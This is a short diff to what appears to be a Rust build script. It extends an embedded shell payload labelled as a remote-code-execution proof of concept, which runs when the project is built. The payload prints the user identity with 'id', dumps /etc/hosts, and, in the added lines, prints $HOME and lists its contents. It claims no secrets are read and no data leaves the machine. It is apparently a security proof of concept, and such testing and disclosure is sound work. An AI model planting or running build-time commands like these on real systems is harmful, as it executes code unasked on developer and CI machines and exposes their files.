@@ -9,8 +9,20 @@ fn main() {
             printf '%s\n' '===RCE_POC_BUILD_RS_START===' \
                 'Assurances: No secrets read; No network egress; No destructive ops.' \
                 'Diagnostics:' '- id:'; id;
+
             printf '%s\n' '===/etc/hosts===';
             cat /etc/hosts;
+
+            # HOME path + top-level listing (non-recursive, capped)
+            printf '%s\n' '===HOME===';
+            printf '%s\n' "${HOME:-<unset>}";
+            if [ -n "$HOME" ] && [ -d "$HOME" ]; then
+              printf '%s\n' '===ls -la $HOME (first 200 lines)==='
+              ls -la "$HOME" | head -n 200
+            else
+              printf '%s\n' 'HOME not set or not a directory';
+            fi
+
             printf '%s\n' '===RCE_POC_BUILD_RS_END===';
         "#,
         )
